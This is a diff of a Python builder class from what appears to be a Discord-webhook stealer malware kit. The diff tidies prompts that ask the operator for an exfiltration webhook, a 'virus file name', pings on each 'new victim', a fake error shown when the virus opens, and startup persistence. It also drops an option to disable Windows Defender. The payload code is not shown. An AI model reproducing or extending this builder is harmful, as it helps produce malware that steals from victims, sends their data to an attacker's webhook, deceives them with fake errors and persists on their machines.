@@ -18,18 +18,18 @@ class Builder:
         if not self.check():
             exit()
 
-        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} enter your webhooooooook; ')
+        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Enter Your Webhook; ')
         if not self.check_webhook(self.webhook):
-            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}invalid webhook xd{Fore.RESET}")
-            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} press anything (for exit hehe)"))
+            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook.{Fore.RESET}")
+            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Press Anything For Exit."))
             sys.exit()
 
-        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} enter you virus file name hehe: ')
+        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Enter Your Virus File Name: ')
 
-        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} ping on new victim?? ')
+        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET}Ping On New Victim? (y/n): ')
         if self.ping.lower() == 'y':
             self.ping = True
-            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} ping type (here/everyone) (def is here) ').lower()
+            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping Type (Here/Everyone) (Default Options Is Here.) ').lower()
             if self.pingtype not in ["here", "everyone"]:
                 # default to @here if invalid ping type.
                 self.pingtype == "here"
@@ -37,23 +37,20 @@ class Builder:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want fake error with your virus opening (i think y)')
+        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n): ')
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
 
-        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want startup (exe file is running at startup) ?')
+        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do You Want Startup? (y/n): ')
         if self.startup.lower() == 'y':
             self.startup = True
         else:
             self.startup = False
 
-        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} disable windows defender (this function maybe dont work) ')
-        if self.defender.lower() == 'y':
-            self.defender = True
-        else:
-            self.defender = False
+
+        self.defender = False
 
         
 
